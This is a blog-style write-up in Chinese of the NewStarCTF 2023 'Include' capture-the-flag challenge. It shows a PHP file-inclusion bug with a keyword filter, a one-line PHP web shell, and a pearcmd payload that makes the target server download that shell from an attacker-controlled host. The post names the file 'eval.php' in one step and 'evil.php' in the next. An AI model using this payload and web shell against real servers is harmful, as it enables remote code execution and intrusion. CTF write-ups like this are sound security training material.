---
title: '[NewStarCTF 2023 公开赛道]Include 🍐'
date: 2025-02-02 21:54:43
tags: pearcmd
categories: 刷题笔记
---

## [NewStarCTF 2023 公开赛道]Include 🍐

一眼看去，有提示我们看phpinfo.php

```php
<?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        
        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }
        
        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?>
```

我们访问，在flag处发现提示

![image-20250202215741125](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022157191.png)

提示我们检查register_argc_argv，我们发现register_argc_argv配置是打开的，那我们就可以通过pear命令进行任意文件读取

![image-20250202221717298](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022217454.png)

```
<?php 
echo '<?php system($_GET[0]);';
```

我们在vps上上传恶意文件

```
?f=pearcmd&+install+-R+/var/www/html+http://ip:port/eval.php
```

然后我们访问/tmp/pear/download/evil.php直接命令执行即可

得到flag

![image-20250202221542360](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022215407.png)

参考

[register_argc_argv与include结合](https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/)
